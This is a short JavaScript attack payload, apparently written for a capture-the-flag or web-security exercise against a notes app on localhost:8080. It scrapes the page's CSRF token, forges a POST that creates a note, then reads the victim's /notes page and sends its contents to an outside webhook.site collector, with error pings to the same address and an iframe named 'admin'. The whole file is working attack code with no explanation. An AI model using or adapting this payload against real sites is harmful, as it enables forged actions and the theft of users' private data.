async function main(){
  fetch("http://localhost:8080/new").
  then(res => res.text()).
  catch(err => {
    fetch("https://webhook.site/03bdd3ef-2a80-44d9-a00d-1ee918d12ad9?error=error1");
  }).
  then(data => {
    console.log(data);
    csrf = data.match(/<input type="hidden" name="_csrf" value="(.*)">/);
    fetch("http://localhost:8080/new", {
      headers: {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      method: "POST",
      body: "_csrf=" + csrf[1] + "&title=remote2&content=remote"
    }).
    then(() => {
      fetch("http://localhost:8080/notes").
      then(res => res.text()).
      then(data => {
        fetch("https://webhook.site/03bdd3ef-2a80-44d9-a00d-1ee918d12ad9?c=remote", {
          headers: {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded'
          },
          method: "POST",
          body: "data=" + data
        }).
        then(() => {
          ifr = document.createElement('iframe');
          ifr.src = "http://localhost:8080/notes";
          ifr.name='admin';
          iframe1.appendChild(ifr);
        })
      })
    }).
    catch(err => {
      fetch("https://webhook.site/03bdd3ef-2a80-44d9-a00d-1ee918d12ad9?error=error2");
    })
  })
}